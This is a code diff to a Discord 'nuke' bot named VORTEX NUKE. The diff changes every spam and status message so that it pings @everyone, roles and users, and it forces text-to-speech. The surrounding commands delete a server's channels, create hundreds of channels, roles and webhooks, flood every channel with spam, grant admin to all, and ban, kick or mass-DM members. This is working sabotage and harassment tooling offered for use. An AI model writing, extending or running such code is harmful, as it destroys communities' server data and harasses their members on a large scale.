@@ -43,7 +43,9 @@ class Config:
     CHAOS_PERMISSIONS = [True, False, None, True, False, None, True]
 
 config = Config()
-bot = commands.Bot(command_prefix=config.PREFIX, intents=discord.Intents.all())
+intents = discord.Intents.all()
+intents.message_content = True
+bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
 bot.remove_command("help")
 
 def is_whitelisted(ctx):
@@ -58,6 +60,10 @@ async def download_image(url):
     except:
         pass
     return None
+
+# Mention helper
+def mention_all():
+    return discord.AllowedMentions(everyone=True, roles=True, users=True)
 
 @bot.event
 async def on_ready():
@@ -82,7 +88,7 @@ async def globally_check_dm(ctx):
 async def mega_nuke(ctx):
     if not is_whitelisted(ctx): return
     guild = ctx.guild
-    await ctx.send("💀 INITIATING MEGA NUKE...", delete_after=2)
+    await ctx.send("💀 INITIATING MEGA NUKE...", delete_after=2, allowed_mentions=mention_all())
     
     # Delete everything
     for channel in guild.channels:
@@ -169,11 +175,11 @@ async def mega_nuke(ctx):
                 pass
             await asyncio.sleep(0.01)
     
-    # Massive spam in every text channel - 100 messages each
+    # Massive spam in every text channel - 100 messages each with @everyone
     for channel in guild.text_channels:
         for _ in range(100):
             try:
-                await channel.send(config.SPAM_MESSAGE, tts=True)
+                await channel.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
             except:
                 pass
             await asyncio.sleep(0.005)
@@ -209,14 +215,14 @@ async def mega_nuke(ctx):
         except:
             pass
     
-    await ctx.send("✅ MEGA NUKE COMPLETE. 500+ CHANNELS, 500+ ROLES, SPAM FLOOD.", delete_after=5)
+    await ctx.send("✅ MEGA NUKE COMPLETE. 500+ CHANNELS, 500+ ROLES, SPAM FLOOD.", delete_after=5, allowed_mentions=mention_all())
 
 @bot.command()
 async def hyper_spam(ctx):
     if not is_whitelisted(ctx): return
     for _ in range(2000):
         try:
-            await ctx.send(f"{config.SPAM_MESSAGE} [{random.randint(1,99999)}]", tts=True)
+            await ctx.send(f"{config.SPAM_MESSAGE} [{random.randint(1,99999)}]", tts=True, allowed_mentions=mention_all())
         except:
             pass
         await asyncio.sleep(0.002)
@@ -227,7 +233,7 @@ async def global_spam(ctx):
     for channel in ctx.guild.text_channels:
         for _ in range(200):
             try:
-                await channel.send(f"{config.SPAM_MESSAGE} 🔥", tts=True)
+                await channel.send(f"{config.SPAM_MESSAGE} 🔥", tts=True, allowed_mentions=mention_all())
             except:
                 pass
             await asyncio.sleep(0.002)
@@ -253,7 +259,7 @@ async def create_army(ctx):
             await asyncio.sleep(0.02)
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
-    await ctx.send("✅ ARMY DEPLOYED: 500 roles, 500 channels", delete_after=3)
+    await ctx.send("✅ ARMY DEPLOYED: 500 roles, 500 channels", delete_after=3, allowed_mentions=mention_all())
 
 @bot.command()
 async def voice_flood(ctx):
@@ -267,7 +273,7 @@ async def voice_flood(ctx):
             await asyncio.sleep(0.02)
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
-    await ctx.send("✅ 300 VOICE CHANNELS CREATED", delete_after=3)
+    await ctx.send("✅ 300 VOICE CHANNELS CREATED", delete_after=3, allowed_mentions=mention_all())
 
 @bot.command()
 async def webhook_tsunami(ctx):
@@ -279,7 +285,7 @@ async def webhook_tsunami(ctx):
             except:
                 pass
             await asyncio.sleep(0.005)
-    await ctx.send("✅ WEBHOOK TSUNAMI DEPLOYED", delete_after=3)
+    await ctx.send("✅ WEBHOOK TSUNAMI DEPLOYED", delete_after=3, allowed_mentions=mention_all())
 
 @bot.command()
 async def total_anarchy(ctx):
@@ -305,7 +311,7 @@ async def total_anarchy(ctx):
             await role.edit(position=pos)
         except:
             pass
-    await ctx.send("✅ TOTAL ANARCHY IMPOSED", delete_after=3)
+    await ctx.send("✅ TOTAL ANARCHY IMPOSED", delete_after=3, allowed_mentions=mention_all())
 
 @bot.command()
 async def purge_all_pins(ctx):
@@ -321,7 +327,7 @@ async def purge_all_pins(ctx):
                 await asyncio.sleep(0.005)
         except:
             pass
-    await ctx.send("✅ ALL PINS REMOVED", delete_after=3)
+    await ctx.send("✅ ALL PINS REMOVED", delete_after=3, allowed_mentions=mention_all())
 
 # Original commands kept for compatibility
 @bot.command()
@@ -429,7 +435,7 @@ async def spam(ctx, count: int = config.SPAM_COUNT):
     count = max(1, min(count, 500))
     for _ in range(count):
         try:
-            await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
+            await ctx.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
         except:
             pass
         await asyncio.sleep(0.002)
@@ -441,7 +447,7 @@ async def mspam(ctx, count: int = config.SPAM_COUNT):
     for channel in ctx.guild.text_channels:
         for _ in range(count):
             try:
-                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
+                await channel.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
             except:
                 pass
             await asyncio.sleep(0.002)
@@ -470,13 +476,13 @@ async def kill(ctx):
 async def help(ctx):
     embed = discord.Embed(
         title="💀 VORTEX NUKE - MASSIVE",
-        description="**MEGA NUKE**: 500 channels, 500 roles, 200 voice, 50 categories, 50 webhooks/channel, 100 spam/channel, pins, invites, admin all, timeout all.",
+        description="**MEGA NUKE**: 500 channels, 500 roles, 200 voice, 50 categories, 50 webhooks/channel, 100 spam/channel, pins, invites, admin all, timeout all. **@everyone mention enabled**",
         color=discord.Color.red(),
         timestamp=datetime.now()
     )
     embed.add_field(name="💥 MEGA", value="`mega_nuke` `hyper_spam` `global_spam` `create_army` `voice_flood` `webhook_tsunami` `total_anarchy` `purge_all_pins`", inline=False)
     embed.add_field(name="🔧 STANDARD", value="`nuke` `cchannels` `croles` `dchannels` `droles` `adminall` `rnickall` `timeoutall` `banall` `kickall` `spam` `mspam` `dmall` `kill`", inline=False)
-    embed.set_footer(text="VORTEX TEAM | No limits. Max destruction.")
-    await ctx.send(embed=embed)
+    embed.set_footer(text="VORTEX TEAM | @everyone ping active")
+    await ctx.send(embed=embed, allowed_mentions=mention_all())
 
 bot.run(config.TOKEN)
